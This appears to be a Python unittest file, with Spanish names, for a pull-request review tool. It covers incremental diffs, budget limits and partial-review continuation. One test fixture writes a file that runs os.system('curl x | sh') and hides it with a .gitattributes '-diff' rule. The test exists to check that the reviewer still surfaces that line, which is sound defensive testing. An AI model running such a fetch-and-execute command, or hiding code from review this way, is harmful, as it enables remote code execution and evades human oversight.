import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

import review_context  # noqa: E402
import review_domain as domain  # noqa: E402
from review_context import (  # noqa: E402
    GitRepository,
    digest_de_politica,
    prepare_review,
)


def git(cwd, *args):
    return subprocess.run(
        ["git", *args], cwd=cwd, check=True, text=True, capture_output=True
    ).stdout.strip()


def hacer_repo(tmp):
    repo = Path(tmp, "repo")
    repo.mkdir()
    git(repo, "init", "-q", "-b", "main")
    git(repo, "config", "user.email", "t@t")
    git(repo, "config", "user.name", "t")
    return repo


def commit(repo, mensaje):
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", mensaje)
    return git(repo, "rev-parse", "HEAD")


def lineas(n, prefijo):
    return [f"{prefijo}{i} = {i}\n" for i in range(n)]


def memoria(head, base, digest, completion=domain.COMPLETE_CLAIM):
    return domain.snapshot_a_v3(
        domain.Snapshot(
            schema=2,
            generation=1,
            revision=domain.Revision(
                base_sha=base, head_sha=head, policy_digest=digest
            ),
            next_id=1,
            completion=completion,
            findings=[],
            command_cursor=0,
        )
    )


def memoria_vacia():
    return domain.Snapshot(
        schema=3,
        generation=1,
        revision=None,
        next_id=1,
        completion=domain.UNKNOWN,
        findings=[],
        command_cursor=0,
    )


def solicitud(head, base, digest):
    return domain.WorkRequest(
        id=1,
        kind="review",
        origin="push",
        basis_generation=1,
        state="pending",
        target=domain.ReviewTarget(
            repository="o/r",
            pr_number=1,
            head_sha=head,
            base_sha=base,
            merge_base_sha=base,
            policy_digest=digest,
        ).json(),
        solicitante="",
    )


class IncrementalContext(unittest.TestCase):
    def test_moving_a_binary_in_a_later_push_still_prepares(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = hacer_repo(tmp)
            (repo / "a.py").write_text("a = 1\n")
            (repo / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n" + bytes(range(256)))
            base = commit(repo, "base")
            (repo / "a.py").write_text("a = 2\n")
            prev = commit(repo, "prev")
            (repo / "assets").mkdir()
            git(repo, "mv", "logo.png", "assets/logo.png")
            head = commit(repo, "head")
            policy = domain.ReviewPolicy(diff_mode="incremental")
            digest = digest_de_politica(policy)
            result = prepare_review(
                GitRepository(repo),
                solicitud(head, base, digest),
                memoria(prev, base, digest),
                policy,
            )
            self.assertIn(
                review_context.Omission(ruta="assets/logo.png", causa="filtro *.png"),
                result.omisiones,
            )

    def test_base_movement_scopes_by_valid_coverage(self):
        """El alcance del cambio de base se acota por la cobertura válida del libro."""
        with tempfile.TemporaryDirectory() as tmp:
            repo = hacer_repo(tmp)
            (repo / "readme.md").write_text("# proyecto\n")
            raiz = commit(repo, "raíz")
            (repo / "z_antecesor.py").write_text("antecesor = 1\n")
            base_vieja = commit(repo, "base vieja")
            (repo / "a.py").write_text("".join(lineas(200, "a_")))
            prev = commit(repo, "prev")
            (repo / "y_correccion.py").write_text("y = 1\n")
            head = commit(repo, "head")
            policy = domain.ReviewPolicy(diff_mode="incremental")
            digest = digest_de_politica(policy)
            result = prepare_review(
                GitRepository(repo),
                solicitud(head, raiz, digest),
                memoria(prev, base_vieja, digest),
                policy,
                cobertura_previa={
                    "a.py": git(repo, "rev-parse", f"{prev}:a.py")
                },
            )
            self.assertEqual(
                sorted(p.text for p in result.entregados),
                ["y_correccion.py", "z_antecesor.py"],
            )
            self.assertIn("antecesor = 1", result.partes["z_antecesor.py"])
            self.assertNotIn("a_0 = 0", result.partes["y_correccion.py"])

    def test_merging_the_base_into_the_pr_reviews_only_the_pr_changes(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = hacer_repo(tmp)
            (repo / "shared.py").write_text("".join(lineas(40, "linea")))
            (repo / "solo_base.py").write_text("m = 1\n")
            commit(repo, "base")
            git(repo, "checkout", "-q", "-b", "pr")
            texto = (repo / "shared.py").read_text()
            (repo / "shared.py").write_text(
                texto.replace("linea2 = 2", "linea2 = 'pr'")
            )
            prev = commit(repo, "pr")
            git(repo, "checkout", "-q", "main")
            texto = (repo / "shared.py").read_text()
            (repo / "shared.py").write_text(
                texto.replace("linea35 = 35", "linea35 = 'main'")
            )
            (repo / "solo_base.py").write_text("m = 'main'\n")
            base_nueva = commit(repo, "avanza base")
            git(repo, "checkout", "-q", "pr")
            git(repo, "merge", "-q", "--no-edit", "main")
            head = git(repo, "rev-parse", "HEAD")
            policy = domain.ReviewPolicy(diff_mode="incremental")
            digest = digest_de_politica(policy)
            result = prepare_review(
                GitRepository(repo),
                solicitud(head, base_nueva, digest),
                memoria(prev, base_nueva, digest),
                policy,
                cobertura_previa={
                    "shared.py": git(repo, "rev-parse", f"{prev}:shared.py")
                },
            )
            self.assertEqual([p.text for p in result.entregados], ["shared.py"])
            cambios = [
                linea
                for linea in result.partes["shared.py"].splitlines()
                if linea[:1] in "+-" and not linea.startswith(("+++", "---"))
            ]
            self.assertEqual(cambios, ["-linea2 = 2", "+linea2 = 'pr'"])

    def test_strict_budget_leaves_obligation_pending(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = hacer_repo(tmp)
            (repo / "readme.md").write_text("# proyecto\n")
            (repo / "f1.py").write_text("".join(lineas(20, "v1_")))
            (repo / "f2.py").write_text("".join(lineas(100, "v1_")))
            base = commit(repo, "base")
            (repo / "readme.md").write_text("# proyecto\n\nsegundo push\n")
            prev = commit(repo, "prev")
            (repo / "f1.py").write_text("".join(lineas(40, "v2_")))
            (repo / "f2.py").write_text("".join(lineas(4000, "v2_")))
            head = commit(repo, "head")
            for estricto in (True, False):
                with self.subTest(strict_budget=estricto):
                    policy = domain.ReviewPolicy(
                        diff_mode="incremental",
                        strict_budget=estricto,
                        diff_max_bytes=20000 if estricto else 200,
                    )
                    digest = digest_de_politica(policy)
                    result = prepare_review(
                        GitRepository(repo),
                        solicitud(head, base, digest),
                        memoria(prev, base, digest),
                        policy,
                    )
                    entregados = [p.text for p in result.entregados]
                    self.assertIn("f1.py", entregados)
                    if estricto:
                        al_presupuesto = [
                            om for om in result.omisiones if om.causa == "presupuesto"
                        ]
                        self.assertEqual([om.ruta for om in al_presupuesto], ["f2.py"])
                        self.assertNotIn("f2.py", entregados)
                        self.assertTrue(
                            any(
                                om.causa in ("presupuesto", "budget", "encoding")
                                for om in result.omisiones
                            )
                        )
                    else:
                        self.assertGreater(result.over_budget_bytes, 0)
                        self.assertFalse(
                            any(om.causa == "presupuesto" for om in result.omisiones)
                        )

        with tempfile.TemporaryDirectory() as tmp:
            repo = hacer_repo(tmp)
            (repo / "readme.md").write_text("# proyecto\n")
            (repo / "g.py").write_text("".join(lineas(20, "v1_")))
            base = commit(repo, "base")
            (repo / "readme.md").write_text("# proyecto\n\nsegundo push\n")
            prev = commit(repo, "prev")
            (repo / "g.py").write_text("".join(lineas(5000, "v2_")))
            head = commit(repo, "head")
            with self.subTest("primer archivo mayor que todo el presupuesto"):
                policy = domain.ReviewPolicy(
                    diff_mode="incremental",
                    strict_budget=True,
                    diff_max_bytes=200,
                )
                digest = digest_de_politica(policy)
                result = prepare_review(
                    GitRepository(repo),
                    solicitud(head, base, digest),
                    memoria(prev, base, digest),
                    policy,
                )
                al_presupuesto = [
                    om for om in result.omisiones if om.causa == "presupuesto"
                ]
                self.assertEqual([om.ruta for om in al_presupuesto], ["g.py"])
                entregados = [p.text for p in result.entregados]
                self.assertNotIn("g.py", entregados)
                self.assertTrue(
                    any(
                        om.causa in ("presupuesto", "budget", "encoding")
                        for om in result.omisiones
                    )
                )

class AtributosDeGit(unittest.TestCase):
    def test_gitattributes_del_pr_no_oculta_un_archivo(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = hacer_repo(tmp)
            (repo / "a.py").write_text("a = 1\n")
            base = commit(repo, "base")
            (repo / "payload.py").write_text("import os\nos.system('curl x | sh')\n")
            (repo / ".gitattributes").write_text("payload.py -diff\n")
            head = commit(repo, "pr")
            policy = domain.ReviewPolicy(diff_mode="incremental")
            digest = digest_de_politica(policy)
            result = prepare_review(
                GitRepository(repo),
                solicitud(head, base, digest),
                memoria_vacia(),
                policy,
            )
            self.assertIn("payload.py", [p.text for p in result.entregados])
            self.assertIn("+os.system('curl x | sh')", result.partes["payload.py"])


class ContinuationContext(unittest.TestCase):
    def test_continuacion_mide_desde_la_acreditacion_previa(self):
        """Ningún archivo vuelve a pagar el diff histórico del PR."""
        with tempfile.TemporaryDirectory() as tmp:
            repo = hacer_repo(tmp)
            (repo / "readme.md").write_text("# proyecto\n")
            base = commit(repo, "base")
            (repo / "a.py").write_text("".join(lineas(200, "a_")))
            (repo / "b.py").write_text("b = 1\n")
            prev = commit(repo, "prev")
            with (repo / "a.py").open("a") as fh:
                fh.write("a_correccion = 1\n")
            (repo / "z.py").write_text("z = 1\n")
            head = commit(repo, "head")
            policy = domain.ReviewPolicy(diff_mode="incremental")
            digest = digest_de_politica(policy)
            result = prepare_review(
                GitRepository(repo),
                solicitud(head, base, digest),
                memoria(prev, base, digest, completion=domain.PARTIAL),
                policy,
                cobertura_previa={
                    "a.py": git(repo, "rev-parse", f"{prev}:a.py")
                },
            )
            self.assertEqual(
                sorted(p.text for p in result.entregados), ["a.py", "b.py", "z.py"]
            )
            self.assertIn("a_correccion = 1", result.partes["a.py"])
            self.assertNotIn("a_0 = 0", result.partes["a.py"])
            self.assertIn("b = 1", result.partes["b.py"])
            self.assertNotIn("a_0 = 0", result.partes["b.py"])

    def test_pendiente_cambiado_llega_desde_la_base(self):
        """Lo pendiente nunca acreditado que cambió entrega su tramo completo.

        b.py entró al PR antes de la parcial, el libro solo acreditó a.py y
        head vuelve a tocar b.py: su tramo base..prev jamás fue revisado, así
        que llega desde merge_base y no como delta desde previous_head.
        """
        with tempfile.TemporaryDirectory() as tmp:
            repo = hacer_repo(tmp)
            (repo / "a.py").write_text("a = 1\n")
            base = commit(repo, "base")
            (repo / "a.py").write_text("a = 2\n")
            (repo / "b.py").write_text("".join(lineas(200, "b_")))
            prev = commit(repo, "a acreditado, b pendiente")
            with (repo / "a.py").open("a") as fh:
                fh.write("a_correccion = 1\n")
            with (repo / "b.py").open("a") as fh:
                fh.write("b_correccion = 1\n")
            head = commit(repo, "b cambia de nuevo")
            policy = domain.ReviewPolicy(diff_mode="incremental")
            digest = digest_de_politica(policy)
            result = prepare_review(
                GitRepository(repo),
                solicitud(head, base, digest),
                memoria(prev, base, digest, completion=domain.PARTIAL),
                policy,
                cobertura_previa={
                    "a.py": git(repo, "rev-parse", f"{prev}:a.py")
                },
            )
            self.assertEqual(
                sorted(p.text for p in result.entregados), ["a.py", "b.py"]
            )
            self.assertIn("b_correccion = 1", result.partes["b.py"])
            self.assertIn("b_0 = 0", result.partes["b.py"])
            self.assertIn("b_199 = 199", result.partes["b.py"])


class BudgetContext(unittest.TestCase):
    def test_budget_exclusions(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = hacer_repo(tmp)
            (repo / "readme.md").write_text("# proyecto\n")
            (repo / "f1.py").write_text("".join(lineas(3, "v1_")))
            (repo / "f2.py").write_text("".join(lineas(200, "v1_")))
            base = commit(repo, "base")
            (repo / "readme.md").write_text("# proyecto\n\nsegundo push\n")
            prev = commit(repo, "prev")
            (repo / "f1.py").write_text("".join(lineas(4, "v2_")))
            (repo / "f2.py").write_text("".join(lineas(4000, "v2_")))
            head = commit(repo, "head")
            policy = domain.ReviewPolicy(
                diff_mode="incremental",
                strict_budget=True,
                diff_max_bytes=200,
            )
            digest = digest_de_politica(policy)
            result = prepare_review(
                GitRepository(repo),
                solicitud(head, base, digest),
                memoria(prev, base, digest),
                policy,
            )
            self.assertTrue(
                any(
                    om.causa in ("presupuesto", "budget", "encoding")
                    for om in result.omisiones
                )
            )
            al_presupuesto = [
                om for om in result.omisiones if om.causa == "presupuesto"
            ]
            self.assertEqual([om.ruta for om in al_presupuesto], ["f2.py"])
